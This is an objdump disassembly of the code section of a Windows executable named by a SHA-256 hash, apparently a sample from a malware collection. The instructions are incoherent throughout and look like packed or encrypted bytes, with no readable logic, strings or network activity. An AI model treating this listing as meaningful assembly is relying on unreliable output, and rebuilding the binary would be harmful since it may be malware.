
23b08345aa0fec3d4cbae7a1c280b5c44703adf2b478e47fa015133658d688c1.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    eax,0x61804
  401005:	add    ah,BYTE PTR [ecx]
  401007:	inc    esi
  401008:	nop
  401009:	mov    al,ds:0x15ed3014
  40100e:	pusha  
  40100f:	add    BYTE PTR [eax],cl
  401011:	and    DWORD PTR [eax],edx
  401013:	ror    BYTE PTR [ecx+0x27],0x12
  401017:	inc    eax
  401018:	dec    esp
  401019:	or     BYTE PTR [edx],al
  40101b:	nop
  40101c:	add    eax,0x4016322
  401021:	adc    BYTE PTR [eax],cl
  401023:	adc    DWORD PTR [eax+eax*8],eax
  401026:	push   esp
  401027:	inc    esp
  401028:	inc    edx
  401029:	jno    0x40104c
  40102b:	nop
  40102c:	rol    BYTE PTR [ebp+0x1],1
  40102f:	add    BYTE PTR [eax+eax*1+0x12040061],ch
  401036:	xor    BYTE PTR [ecx+eax*2+0x4],dl
  40103a:	and    al,BYTE PTR [eax]
  40103c:	or     al,0x37
  40103e:	xor    DWORD PTR [eax],edx
  401040:	adc    ah,0x84
  401043:	add    BYTE PTR [eax+0x6a0334],al
  401049:	inc    esp
  40104a:	aam    0x80
  40104c:	or     BYTE PTR [eax-0x60],bl
  40104f:	sub    BYTE PTR [eax],0x22
  401052:	and    al,0x4
  401054:	and    BYTE PTR [eax-0x6dd5fc98],cl
  40105a:	adc    BYTE PTR [ebx],al
  40105c:	xchg   esp,eax
  40105d:	add    BYTE PTR [esi],al
  40105f:	inc    ebp
  401060:	add    al,0x82
  401062:	sbb    BYTE PTR [eax],al
  401064:	inc    eax
  401065:	and    BYTE PTR [eax],ah
  401067:	adc    dl,BYTE PTR [eax+0x1e]
  40106a:	pop    ecx
  40106b:	inc    eax
  40106c:	fadd   DWORD PTR [eax]
  40106e:	nop
  40106f:	nop
  401070:	add    BYTE PTR [eax+0x4a],ah
  401073:	and    BYTE PTR [eax],al
  401075:	sbb    BYTE PTR [eax+0x13040680],al
  40107b:	inc    ecx
  40107c:	dec    eax
  40107d:	push   eax
  40107e:	or     BYTE PTR [ecx],0x90
  401081:	jno    0x40100b
  401083:	and    BYTE PTR [eax],al
  401085:	add    al,0x4
  401087:	add    cl,BYTE PTR [eax]
  401089:	or     al,0x24
  40108b:	les    ebx,FWORD PTR [ecx]
  40108d:	add    bl,BYTE PTR [ecx-0x7f7ff9dc]
  401093:	adc    BYTE PTR [edx-0x30],al
  401096:	mov    al,ds:0x8a0b040e
  40109b:	and    ecx,DWORD PTR [edx]
  40109d:	adc    BYTE PTR [eax],al
  40109f:	shl    BYTE PTR [eax],0x0
  4010a2:	and    BYTE PTR [eax+eax*1],ch
  4010a5:	push   esi
  4010a6:	xchg   esp,eax
  4010a7:	add    eax,0x81649000
  4010ac:	adc    ah,BYTE PTR [ebx+0x13590182]
  4010b2:	xor    BYTE PTR [eax],ah
  4010b4:	add    BYTE PTR [edx+0x20981a06],dh
  4010ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010bb:	and    BYTE PTR [eax+eax*1],al
  4010be:	inc    eax
  4010bf:	or     al,0x2c
  4010c1:	mov    edx,0x2280035
  4010c6:	add    BYTE PTR [ebx+0x40],0x0
  4010ca:	and    BYTE PTR [eax],0x42
  4010cd:	add    eax,0x42403284
  4010d2:	sub    ch,BYTE PTR [eax+eiz*2]
  4010d5:	and    eax,DWORD PTR [eax+0x658300]
  4010db:	dec    esp
  4010dc:	or     DWORD PTR [ecx+0x0],eax
  4010df:	add    BYTE PTR [ecx+0x0],dl
  4010e2:	xchg   ecx,eax
  4010e3:	or     esi,DWORD PTR [eax]
  4010e5:	jae    0x4010e8
  4010e7:	pop    ecx
  4010e8:	mov    BYTE PTR [eax],cl
  4010ea:	inc    edx
  4010eb:	test   BYTE PTR [ebx-0x7e],dl
  4010ee:	inc    eax
  4010ef:	adc    BYTE PTR [eax],al
  4010f1:	mov    es,WORD PTR [ecx]
  4010f3:	dec    eax
  4010f4:	and    BYTE PTR [eax],al
  4010f6:	or     BYTE PTR [ecx+0x1200a040],cl
  4010fc:	adc    BYTE PTR [eax-0x6cbde7f6],dl
  401102:	or     DWORD PTR [eax+eiz*2],eax
  401105:	push   cs
  401106:	adc    bl,BYTE PTR [eax-0x80]
  401109:	add    cl,BYTE PTR [eax]
  40110b:	add    BYTE PTR [eax+0x1058900a],al
  401111:	or     BYTE PTR [eax+edx*1],al
  401114:	dec    ecx
  401115:	or     BYTE PTR [ecx+eax*4],al
  401118:	or     BYTE PTR [edx],al
  40111a:	add    BYTE PTR [edx+0x5],ah
  40111d:	adc    DWORD PTR [ecx-0x3dfbedb8],esp
  401123:	adc    eax,0x6118904c
  401128:	or     al,BYTE PTR [eax]
  40112a:	pop    es
  40112b:	adc    cl,BYTE PTR [eax+0x0]
  40112e:	inc    ebx
  40112f:	push   es
  401130:	or     al,0x9a
  401132:	add    BYTE PTR [eax],dl
  401134:	add    eax,0xca00087
  401139:	mov    al,ds:0x16019028
  40113e:	add    BYTE PTR [esi+eax*1],al
  401141:	test   BYTE PTR [eax],al
  401143:	or     BYTE PTR [eax],0x0
  401146:	add    al,BYTE PTR [ebx]
  401148:	test   BYTE PTR [edx+0x43180168],al
  40114e:	add    BYTE PTR [eax-0x7f5b5f7c],cl
  401154:	add    al,BYTE PTR [ebx]
  401156:	push   eax
  401157:	je     0x401199
  401159:	xchg   edx,eax
  40115a:	and    DWORD PTR [ecx],ebx
  40115c:	and    al,BYTE PTR [esp+eax*1]
  40115f:	adc    BYTE PTR [ecx+0x816010],al
  401165:	or     eax,DWORD PTR [ecx+0x400c0]
  40116b:	cmp    dl,BYTE PTR [ecx]
  40116d:	nop
  40116e:	or     BYTE PTR [eax],al
  401170:	mov    al,0x52
  401172:	add    BYTE PTR [edx],al
  401174:	lea    eax,[eax]
  401176:	add    esp,DWORD PTR [eax]
  401178:	or     BYTE PTR [ebx],al
  40117a:	and    BYTE PTR [edx+0x2008588],ah
  401180:	or     dl,BYTE PTR [eax+0x865186]
  401186:	sub    BYTE PTR [edx+0x4],al
  401189:	or     BYTE PTR [eax],dh
  40118b:	add    cl,BYTE PTR [ebp+0x2008894]
  401191:	or     BYTE PTR [ebp+0x261020],al
  401197:	mov    BYTE PTR [eax],0x24
  40119a:	dec    ecx
  40119b:	pop    ecx
  40119c:	or     eax,0xaa0539
  4011a1:	sub    DWORD PTR [esi],ecx
  4011a3:	and    BYTE PTR [ecx+edx*1],0x58
  4011a7:	dec    eax
  4011a8:	add    al,cl
  4011aa:	or     al,0x90
  4011ac:	or     al,0x9
  4011ae:	add    BYTE PTR [eax+0x44c42047],cl
  4011b4:	test   eax,0x50044d10
  4011b9:	and    al,BYTE PTR [eax]
  4011bb:	add    BYTE PTR [eax],ah
  4011bd:	es add eax,0xb44e5000
  4011c3:	add    al,0x58
  4011c5:	adc    BYTE PTR [ecx-0x79],al
  4011c8:	push   es
  4011c9:	cwde   
  4011ca:	add    BYTE PTR [eax],al
  4011cc:	xchg   ecx,eax
  4011cd:	inc    eax
  4011ce:	add    al,0x31
  4011d0:	adc    BYTE PTR [eax],al
  4011d2:	or     al,0x3
  4011d4:	adc    dh,cl
  4011d6:	nop
  4011d7:	or     BYTE PTR [edi],0xbc
  4011da:	xchg   edx,eax
  4011db:	shr    BYTE PTR [eax+0x10810313],0x40
  4011e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011e3:	xor    BYTE PTR [eax+0x3201010],al
  4011e9:	or     BYTE PTR [edi-0x6f],dh
  4011ec:	push   ecx
  4011ed:	or     al,0x48
  4011ef:	add    DWORD PTR [eax],0x10e0a020
  4011f5:	sub    BYTE PTR [eax],al
  4011f7:	loopne 0x4011f9
  4011f9:	inc    ebx
  4011fa:	call   0x5014:0x5228000
  401201:	mov    al,0x64
  401203:	mov    BYTE PTR [edi],ah
  401205:	xchg   ecx,eax
  401206:	add    al,0x0
  401208:	inc    ebx
  401209:	or     BYTE PTR [edx],cl
  40120b:	xor    dl,dl
  40120d:	xor    al,BYTE PTR [esi]
  40120f:	add    cl,BYTE PTR [ecx+0x1017091a]
  401215:	xor    dl,dl
  401217:	and    DWORD PTR [edx],0x10c08100
  40121d:	add    BYTE PTR [ebx],0x2
  401220:	pusha  
  401221:	dec    esp
  401222:	mov    ecx,0x8080040
  401227:	ror    BYTE PTR [eax+0x47808284],0x24
  40122e:	and    DWORD PTR [edx-0x5ff9ff80],eax
  401234:	test   BYTE PTR [eax+ebp*4],ch
  401237:	or     BYTE PTR [eax+0x10000828],al
  40123d:	loop   0x401288
  40123f:	inc    edx
  401240:	adc    al,0x91
  401242:	push   es
  401243:	add    DWORD PTR [edx],esp
  401245:	sub    cl,BYTE PTR [eiz*1-0x39faf500]
  40124c:	xchg   ecx,eax
  40124d:	nop
  40124e:	and    cl,BYTE PTR [edi]
  401250:	add    BYTE PTR [ebx+0x8100120],dl
  401256:	add    BYTE PTR [edi],ch
  401258:	adc    eax,0x69cd008e
  40125d:	inc    eax
  40125e:	adc    BYTE PTR [eax+0x31],al
  401261:	inc    eax
  401262:	inc    esp
  401263:	push   eax
  401264:	xor    BYTE PTR [esi],dh
  401266:	xlat   BYTE PTR ds:[ebx]
  401267:	sub    DWORD PTR [eax+0x5],esp
  40126a:	dec    esi
  40126b:	mov    al,ds:0x80800222
  401270:	inc    eax
  401271:	add    BYTE PTR [eax+0x40],al
  401274:	adc    dl,BYTE PTR [edx+edx*2+0x1b001021]
  40127b:	pop    eax
  40127c:	and    BYTE PTR [eax],al
  40127e:	or     al,0x1c
  401280:	push   0xa0400201
  401285:	test   BYTE PTR [eax],ah
  401287:	adc    DWORD PTR ds:0x48005802,eax
  40128d:	inc    eax
  40128e:	and    DWORD PTR [ecx],esi
  401290:	mov    ds:0x830282,eax
  401295:	or     BYTE PTR [eax],al
  401297:	add    BYTE PTR ds:0x2f04400,0x1
  40129e:	or     al,0x0
  4012a0:	sub    BYTE PTR [edi],bl
  4012a2:	add    BYTE PTR [ecx],0x63
  4012a5:	mov    DWORD PTR [eax],eax
  4012a7:	mov    al,ds:0x80806400
  4012ac:	fwait
  4012ad:	add    al,0x5
  4012af:	add    BYTE PTR [eax],0x16
  4012b2:	in     al,0x18
  4012b4:	mov    DWORD PTR [edx-0x6ff7fefe],eax
  4012ba:	pop    eax
  4012bb:	add    BYTE PTR [edi],0x13
  4012be:	push   ss
  4012bf:	push   0x6a068242
  4012c4:	xchg   ecx,eax
  4012c5:	add    al,BYTE PTR [eax]
  4012c7:	and    BYTE PTR [edx],0xa3
  4012ca:	sub    eax,DWORD PTR [ecx]
  4012cc:	add    BYTE PTR [eax+ecx*1],al
  4012cf:	add    DWORD PTR [eax+eax*2+0x401a300],esp
  4012d6:	dec    edx
  4012d7:	adc    al,0x82
  4012d9:	add    al,0x0
  4012db:	test   BYTE PTR [ecx+ecx*1],ah
  4012de:	sub    BYTE PTR [eax+eiz*1],dl
  4012e1:	add    DWORD PTR [ecx-0x50],eax
  4012e4:	or     al,0x0
  4012e6:	inc    ebp
  4012e7:	and    BYTE PTR [eax],0x98
  4012ea:	or     DWORD PTR [eax-0x67],0x21
  4012ee:	add    cl,BYTE PTR [eax-0x7f7ffb7a]
  4012f4:	xchg   esp,eax
  4012f5:	test   eax,0x2080c294
  4012fa:	add    BYTE PTR [edx+0x1027018e],0x2e
  401301:	add    BYTE PTR [ebx],al
  401303:	pusha  
  401304:	inc    esp
  401305:	sbb    DWORD PTR [esi+edx*1],esp
  401308:	dec    ebp
  401309:	shr    DWORD PTR [eax+0x2904734],0x12
  401310:	adc    eax,0x840b04a9
  401315:	add    al,0x32
  401317:	adc    BYTE PTR [edx+eax*4],cl
  40131a:	and    DWORD PTR [esi],esi
  40131c:	add    al,BYTE PTR [ecx+0x0]
  40131f:	or     BYTE PTR [eax],cl
  401321:	or     al,0xa6
  401323:	add    cl,BYTE PTR [eax+eax*1+0x20138400]
  40132a:	int3   
  40132b:	pusha  
  40132c:	test   al,0x43
  40132e:	sub    DWORD PTR [eax],eax
  401330:	mov    ch,0x5
  401332:	xchg   edx,eax
  401333:	sub    BYTE PTR [eax+0x2b],ch
  401336:	adc    BYTE PTR [eax],al
  401338:	push   edx
  401339:	add    DWORD PTR [eax+0x23],0x20
  40133d:	add    BYTE PTR [eax+0xb],cl
  401340:	xchg   esp,eax
  401341:	inc    eax
  401342:	adc    al,0x80
  401344:	or     BYTE PTR [ecx],ch
  401346:	add    BYTE PTR [eax+0x58],al
  401349:	and    al,BYTE PTR [edx]
  40134b:	push   ebp
  40134c:	and    BYTE PTR [edx-0x1ff5ffee],cl
  401352:	enter  0xcc2,0x4
  401356:	xchg   edx,eax
  401357:	adc    DWORD PTR [eax],0x128ac000
  40135d:	add    BYTE PTR [esi+0x4a],0x10
  401361:	inc    esp
  401362:	inc    ecx
  401363:	add    BYTE PTR [edx-0x7c],ah
  401366:	mov    BYTE PTR [eax],cl
  401368:	add    al,BYTE PTR [eax+0x306801]
  40136e:	or     al,0xa0
  401370:	add    DWORD PTR [eax+0x44],eax
  401373:	add    bl,BYTE PTR [eax]
  401375:	inc    eax
  401376:	inc    edx
  401377:	les    eax,FWORD PTR [edi+0x6]
  40137a:	adc    DWORD PTR [edx],eax
  40137c:	add    al,BYTE PTR [eax]
  40137e:	xor    DWORD PTR [edx],0x26020024
  401384:	test   eax,ebx
  401386:	inc    edx
  401387:	add    BYTE PTR [eax+0x20],cl
  40138a:	int3   
  40138b:	rol    BYTE PTR [ecx+0x20140882],0x80
  401392:	test   BYTE PTR [eax],bh
  401394:	dec    ebp
  401395:	or     al,0x80
  401397:	inc    esp
  401398:	add    al,BYTE PTR [edi]
  40139a:	mov    BYTE PTR [eax],al
  40139c:	and    ah,BYTE PTR [eax+edx*1-0x3c]
  4013a0:	add    al,0x68
  4013a2:	ret    0x2410
  4013a5:	or     bl,BYTE PTR [eax]
  4013a7:	xor    BYTE PTR [eax+eax*1],dl
  4013aa:	xor    al,0x1
  4013ac:	or     DWORD PTR [ebp+0xab0012],ebx
  4013b2:	loopne 0x40133e
  4013b4:	inc    edx
  4013b5:	add    esp,DWORD PTR [eax]
  4013b7:	test   eax,0x54c20a52
  4013bc:	xor    eax,0xa103010
  4013c1:	xchg   esp,eax
  4013c2:	add    DWORD PTR [ebx+0x70a0008],0x47
  4013c9:	or     BYTE PTR [eax],dl
  4013cb:	or     DWORD PTR [eax],edx
  4013cd:	add    edx,DWORD PTR [ecx]
  4013cf:	add    BYTE PTR [eax],dl
  4013d1:	add    al,0x4
  4013d3:	adc    eax,0x10604812
  4013d8:	adc    al,0x4
  4013da:	dec    ebx
  4013db:	add    DWORD PTR [eax+0x0],eax
  4013de:	add    bh,al
  4013e0:	mov    eax,0xc0800221
  4013e5:	cmp    al,0x1
  4013e7:	pusha  
  4013e8:	mov    BYTE PTR [ebp+0xa],al
  4013eb:	inc    esp
  4013ec:	jo     0x4013fa
  4013ee:	add    eax,0x411a4a
  4013f3:	add    BYTE PTR [edx+0x4fc01824],ah
  4013f9:	or     BYTE PTR [eax],cl
  4013fb:	sub    BYTE PTR [ebx+edx*1],al
  4013fe:	inc    ecx
  4013ff:	mov    al,ds:0xce445858
  401404:	inc    eax
  401405:	or     BYTE PTR [eax],bl
  401407:	dec    ebx
  401408:	push   0xe085c80
  40140d:	add    BYTE PTR [ebp+0x2],cl
  401410:	add    DWORD PTR [eax+eiz*1+0x0],esp
  401414:	jo     0x401490
  401416:	push   eax
  401417:	add    BYTE PTR [ecx],al
  401419:	add    eax,0x88c41300
  40141e:	or     al,BYTE PTR [ecx+0x8a01008]
  401424:	and    al,0x11
  401426:	and    DWORD PTR [ecx-0x78adef30],eax
  40142c:	push   es
  40142d:	arpl   WORD PTR [edx+esi*1],cx
  401430:	and    BYTE PTR [eax+0x41022048],cl
  401436:	adc    DWORD PTR [edx+0x64],eax
  401439:	add    al,BYTE PTR [ebx]
  40143b:	add    al,0x81
  40143d:	aaa    
  40143e:	nop
  40143f:	add    BYTE PTR [edx+0x44029908],ch
  401445:	inc    eax
  401446:	and    BYTE PTR [eax+eax*1],al
  401449:	dec    eax
  40144a:	add    BYTE PTR [edx+0x14],ch
  40144d:	popa   
  40144e:	dec    edx
  40144f:	adc    BYTE PTR [eax],al
  401451:	add    DWORD PTR [edx-0x60],esp
  401454:	adc    BYTE PTR [eax],ah
  401456:	ins    BYTE PTR es:[edi],dx
  401457:	and    al,0x20
  401459:	adc    dl,BYTE PTR [ecx]
  40145b:	adc    al,0x4
  40145d:	les    edx,FWORD PTR [edx+0x28101880]
  401463:	dec    eax
  401464:	add    al,BYTE PTR [edx+0x844014]
  40146a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40146b:	mov    BYTE PTR [eax],cl
  40146d:	add    eax,DWORD PTR [edx]
  40146f:	inc    eax
  401470:	mov    ah,0x42
  401472:	mov    DWORD PTR [eax],0x48044003
  401478:	pop    esi
  401479:	inc    eax
  40147a:	inc    ecx
  40147b:	add    BYTE PTR [eax+eiz*1+0x0],bl
  40147f:	add    BYTE PTR [ecx],0xd0
  401482:	add    BYTE PTR [ecx],al
  401484:	jb     0x401487
  401486:	add    BYTE PTR [eax],al
  401488:	or     al,0x8
  40148a:	xor    BYTE PTR [esi],ah
  40148c:	add    al,0x11
  40148e:	add    DWORD PTR [eax+0x6500a40],eax
  401494:	add    cl,0x40
  401497:	inc    eax
  401498:	and    al,0x28
  40149a:	nop
  40149b:	adc    BYTE PTR [eax+0x58000622],al
  4014a1:	sub    BYTE PTR [eax],cl
  4014a3:	popa   
  4014a4:	mov    al,0x49
  4014a6:	add    ecx,DWORD PTR [edx]
  4014a8:	and    BYTE PTR [eax+edi*1],al
  4014ab:	adc    eax,0x8c246304
  4014b0:	mov    BYTE PTR [ebx*1+0x700000],al
  4014b7:	nop
  4014b8:	add    eax,0x44110981
  4014bd:	add    BYTE PTR [eax+0x20],al
  4014c0:	or     DWORD PTR [edx+eax*8],ebp
  4014c3:	out    0x4,al
  4014c5:	add    BYTE PTR [ecx],bl
  4014c7:	or     BYTE PTR [eax+eax*1],dl
  4014ca:	add    BYTE PTR [edx+0x1d52296a],dl
  4014d0:	les    esp,FWORD PTR [ebp+0x20]
  4014d3:	inc    esp
  4014d4:	fcom   DWORD PTR [eax]
  4014d6:	lods   al,BYTE PTR ds:[esi]
  4014d7:	push   esi
  4014d8:	dec    ecx
  4014d9:	dec    edx
  4014da:	add    BYTE PTR [edi+0x81a0235],dl
  4014e0:	add    al,0x89
  4014e2:	jge    0x4014f4
  4014e4:	test   BYTE PTR [ecx],al
  4014e6:	adc    BYTE PTR [ecx+0x34],al
  4014e9:	adc    al,0x45
  4014eb:	fadd   DWORD PTR [eax+edx*1+0x29]
  4014ef:	add    al,0x69
  4014f1:	and    BYTE PTR ds:0x22d8454,al
  4014f7:	add    BYTE PTR [edi],al
  4014f9:	sub    al,0xe0
  4014fb:	add    BYTE PTR [edx+0x2810a2a0],0x51
  401502:	xor    BYTE PTR [edx+0x32],al
  401505:	and    ah,BYTE PTR [edx+edx*1]
  401508:	sbb    eax,esi
  40150a:	mov    al,ds:0x4080b294
  40150f:	or     cl,BYTE PTR [eax]
  401511:	xor    BYTE PTR [esi],dl
  401513:	inc    esp
  401514:	add    dl,BYTE PTR [edx-0x7f]
  401517:	ins    DWORD PTR es:[edi],dx
  401518:	sbb    BYTE PTR [eax+0x10],al
  40151b:	adc    BYTE PTR [eax],0x8
  40151e:	nop
  40151f:	add    bl,BYTE PTR [eax+0x48]
  401522:	sbb    esp,DWORD PTR [eax-0x70]
  401525:	jae    0x401537
  401527:	or     al,0xa0
  401529:	or     BYTE PTR [ebx+ecx*2-0x5fafbc40],0x12
  401531:	dec    ecx
  401532:	popa   
  401533:	dec    esi
  401534:	add    BYTE PTR [ecx],ah
  401536:	and    BYTE PTR [eax+0x54],ch
  401539:	or     BYTE PTR ds:0x10458484,ah
  40153f:	fmul   DWORD PTR [ecx]
  401541:	or     BYTE PTR [eax+0x3e0c3032],cl
  401547:	dec    esp
  401548:	adc    al,0x9
  40154b:	rol    BYTE PTR [ebx+esi*1],1
  40154e:	adc    DWORD PTR [eax],eax
  401550:	and    DWORD PTR [ecx],0xffffff81
  401553:	add    BYTE PTR [eax],al
  401555:	add    ah,BYTE PTR [edx]
  401557:	add    ah,BYTE PTR [ebp+0x42]
  40155a:	mov    ch,0x41
  40155c:	lds    eax,FWORD PTR [eax+0x26621202]
  401562:	or     DWORD PTR [eax],eax
  401564:	and    BYTE PTR [eax],al
  401566:	add    al,BYTE PTR [eax]
  401568:	add    DWORD PTR [eax+0x101290aa],0x4909
  401572:	inc    edi
  401573:	fadd   QWORD PTR [ecx+0x42214010]
  401579:	test   BYTE PTR [ecx],al
  40157b:	inc    eax
  40157c:	add    BYTE PTR [eax],0x1
  40157f:	add    BYTE PTR [ebx+0x2071b],al
  401585:	bound  eax,QWORD PTR [eax]
  401587:	push   ss
  401588:	xor    BYTE PTR [edx],al
  40158a:	add    DWORD PTR [eax],edx
  40158c:	xor    dl,BYTE PTR [eax+eax*1]
  40158f:	or     BYTE PTR [ebx],al
  401591:	lds    eax,FWORD PTR [eax]
  401593:	dec    eax
  401594:	loopne 0x401596
  401596:	test   al,0x88
  401598:	add    ch,BYTE PTR [edx+0x15ac3040]
  40159e:	adc    BYTE PTR [eax+0x44031020],al
  4015a4:	adc    DWORD PTR [esi+0x440980b4],ecx
  4015aa:	dec    esi
  4015ab:	add    DWORD PTR [edx],edi
  4015ad:	push   es
  4015ae:	sub    ecx,DWORD PTR [eax+0x2]
  4015b1:	adc    BYTE PTR [ebp+ecx*1-0x27efc7f4],al
  4015b8:	add    BYTE PTR [edx],0x4
  4015bb:	add    BYTE PTR [ecx],bl
  4015bd:	and    ah,dl
  4015bf:	and    BYTE PTR ds:0xcf731046,al
  4015c5:	or     al,cl
  4015c7:	add    BYTE PTR [eax],dl
  4015c9:	add    BYTE PTR [eax+ecx*1],dl
  4015cc:	test   BYTE PTR [esi-0x776f7fde],ah
  4015d2:	and    BYTE PTR es:[edx],al
  4015d5:	mov    eax,0x1084c742
  4015da:	jb     0x4015e4
  4015dc:	or     al,0xb6
  4015de:	and    BYTE PTR [ebx+0x24],0x0
  4015e2:	sub    BYTE PTR [eax+eax*1],bl
  4015e5:	xor    edx,DWORD PTR [eax]
  4015e7:	test   al,0x1a
  4015e9:	add    al,0xc
  4015eb:	push   edi
  4015ec:	and    BYTE PTR [edx],al
  4015ee:	xor    cl,BYTE PTR [eax]
  4015f0:	or     BYTE PTR [eax],bl
  4015f2:	and    al,dh
  4015f4:	test   DWORD PTR [eax],edx
  4015f6:	pop    ss
  4015f7:	mov    es,ecx
  4015f9:	and    eax,0xc4008804
  4015fe:	dec    ecx
  4015ff:	or     al,0x0
  401601:	or     BYTE PTR [eax],al
  401603:	or     BYTE PTR [eax+eax*1],cl
  401606:	adc    BYTE PTR [edx+0x41],al
  401609:	add    eax,0x7402842
  40160e:	add    al,0x0
  401610:	ret    
  401611:	add    BYTE PTR [ecx],ah
  401613:	mov    al,ds:0x40968500
  401618:	add    DWORD PTR [ebp+0xa542719],0x8d06402
  401622:	pop    ds
  401623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401624:	fdivr  QWORD PTR [eax+0x4370e23e]
  40162a:	add    edx,DWORD PTR [edx+0x81000]
  401630:	inc    eax
  401631:	add    BYTE PTR [eax+0xe40027],ah
  401637:	nop
  401638:	push   es
  401639:	push   ecx
  40163a:	add    al,0xc
  40163c:	add    BYTE PTR [eax+eax*1+0x790085c7],ah
  401643:	adc    al,0xb5
  401645:	mov    al,BYTE PTR [eax]
  401647:	sbb    BYTE PTR [eax],dl
  401649:	add    BYTE PTR [edx],dl
  40164b:	adc    DWORD PTR [esi+0x519048b],ebx
  401651:	xchg   ecx,eax
  401652:	add    BYTE PTR [eax],al
  401654:	add    DWORD PTR [esi],0x17094853
  40165a:	inc    eax
  40165b:	nop
  40165c:	inc    esp
  40165d:	inc    eax
  40165e:	add    BYTE PTR [ebp+0x2022385b],0x20
  401665:	and    al,BYTE PTR [eax]
  401667:	or     BYTE PTR [eax],al
  401669:	add    DWORD PTR [edx-0x4b3eff8c],eax
  40166f:	add    BYTE PTR [edx+0x22],ah
  401672:	adc    esp,DWORD PTR [eax]
  401674:	xchg   BYTE PTR [eax],al
  401676:	add    eax,DWORD PTR [esp+eiz*2]
  401679:	add    al,0x84
  40167b:	inc    eax
  40167c:	test   eax,0x23591200
  401681:	es dec edx
  401683:	adc    DWORD PTR [edx],ecx
  401685:	or     BYTE PTR [ebp+0x0],0x2
  401689:	mov    BYTE PTR [edx],0x42
  40168c:	or     eax,0x4100c1
  401692:	push   eax
  401693:	xchg   edx,eax
  401694:	add    DWORD PTR [eax],eax
  401696:	add    esp,DWORD PTR [edx+0x48]
  401699:	add    DWORD PTR [eax],0xa0140148
  40169f:	add    al,BYTE PTR [eax]
  4016a1:	rol    DWORD PTR [edi+0x41626ca8],0x28
  4016a8:	add    DWORD PTR [edx+0x6],eax
  4016ab:	or     al,BYTE PTR [ecx+0x24]
  4016ae:	adc    dl,cl
  4016b0:	add    al,BYTE PTR [eax]
  4016b2:	add    BYTE PTR [eax],bl
  4016b4:	adc    BYTE PTR [eax-0x80],0x40
  4016b8:	or     cl,BYTE PTR [eax+0x25400944]
  4016be:	in     al,dx
  4016bf:	add    BYTE PTR [eax],0x80
  4016c2:	sbb    BYTE PTR [edx],ah
  4016c4:	and    BYTE PTR [edx+ebx*2],bh
  4016c7:	add    BYTE PTR [eax+0x1a0420e0],0x18
  4016ce:	test   al,dl
  4016d0:	push   ss
  4016d1:	bound  eax,QWORD PTR [ebx]
  4016d3:	push   eax
  4016d4:	or     BYTE PTR [eax-0x7a],dl
  4016d7:	es push es
  4016d9:	add    BYTE PTR [esi],al
  4016db:	add    BYTE PTR [ecx],0x31
  4016de:	add    DWORD PTR [ecx],esp
  4016e0:	loop   0x401682
  4016e2:	or     BYTE PTR [eax],bl
  4016e4:	adc    eax,DWORD PTR [ebx+0x18]
  4016e7:	ins    BYTE PTR es:[edi],dx
  4016e8:	or     BYTE PTR [eax],ah
  4016ea:	pop    es
  4016eb:	inc    eax
  4016ec:	adc    BYTE PTR [edx],al
  4016ee:	dec    esp
  4016ef:	ret    0x381a
  4016f2:	and    DWORD PTR [edx],eax
  4016f4:	and    BYTE PTR [edx],0x10
  4016f7:	or     BYTE PTR [ebx+0x1b],ch
  4016fa:	or     BYTE PTR [esi+0x1404804],0x8
  401701:	add    ah,BYTE PTR [eax]
  401703:	add    al,0x21
  401705:	sbb    BYTE PTR [edx+0x5a],al
  401708:	add    DWORD PTR [ecx+0xc001144],edx
  40170e:	inc    edx
  40170f:	add    al,BYTE PTR [ebx+0x200d206]
  401715:	add    al,BYTE PTR [eax]
  401717:	push   eax
  401718:	add    BYTE PTR [ebx],al
  40171a:	or     BYTE PTR ds:0x4445109,al
  401720:	push   esi
  401721:	rcl    BYTE PTR [eax],cl
  401723:	add    BYTE PTR [edx+0x19045858],al
  401729:	dec    eax
  40172a:	rol    BYTE PTR [edx],0x28
  40172d:	and    BYTE PTR [ecx+edx*1+0x10380400],0x42
  401735:	inc    ebx
  401736:	sbb    BYTE PTR [edx+eax*8],0x48
  40173a:	add    dl,BYTE PTR [ecx]
  40173c:	test   al,0x47
  40173e:	pusha  
  40173f:	add    al,BYTE PTR [edx+eax*1+0x80a960c]
  401746:	push   0x4a819084
  40174b:	rcl    al,0x40
  40174e:	add    BYTE PTR [eax+0x28],cl
  401751:	add    al,BYTE PTR [ebx+0x0]
  401754:	rol    BYTE PTR [eax+eax*1],0xb2
  401758:	xor    BYTE PTR [eax+0x20],al
  40175b:	sbb    al,BYTE PTR [edx+0x40]
  40175e:	xchg   BYTE PTR [eax],cl
  401760:	sub    DWORD PTR [eax+0x42],ecx
  401763:	dec    eax
  401764:	add    DWORD PTR [eax+0x53],eax
  401767:	add    BYTE PTR [eax+0x58],al
  40176a:	shl    ah,0x21
  40176d:	add    BYTE PTR [ecx],ch
  40176f:	adc    BYTE PTR [eax],ah
  401771:	add    dl,BYTE PTR [eax]
  401773:	adc    ebp,ebx
  401775:	mov    DWORD PTR [eax-0x21],eax
  401778:	test   BYTE PTR [eax+0x261a040],al
  40177e:	rol    DWORD PTR [edx],1
  401780:	add    DWORD PTR [eax],esp
  401782:	sub    BYTE PTR [edx],al
  401784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401785:	sbb    al,BYTE PTR [ebx]
  401787:	add    BYTE PTR [eax-0x5ffbdec0],al
  40178d:	adc    BYTE PTR [edx+0xa040d40],cl
  401793:	adc    BYTE PTR [ebx],0x3e
  401796:	inc    ecx
  401797:	pushf  
  401798:	or     BYTE PTR [ebp-0x6eff9f9c],dl
  40179e:	or     dl,BYTE PTR [ecx]
  4017a0:	add    BYTE PTR ds:0x63a01880,dl
  4017a6:	add    ch,BYTE PTR [eax-0x3e]
  4017a9:	xchg   edi,eax
  4017aa:	sub    al,BYTE PTR [eax+0x54]
  4017ad:	add    al,BYTE PTR [eax-0x3ff65bcc]
  4017b3:	jo     0x4017b5
  4017b5:	add    BYTE PTR [eax],al
  4017b7:	dec    edx
  4017b8:	add    BYTE PTR [eax],al
  4017ba:	rcl    BYTE PTR [eax+0x22],0xa
  4017be:	(bad)  
  4017bf:	sbb    BYTE PTR [eax+esi*1],ah
  4017c2:	nop
  4017c3:	adc    BYTE PTR [ecx+0x20065c03],ah
  4017c9:	mov    BYTE PTR [edx],al
  4017cb:	add    BYTE PTR [eax],al
  4017cd:	adc    BYTE PTR [eax+0x5c15ff10],al
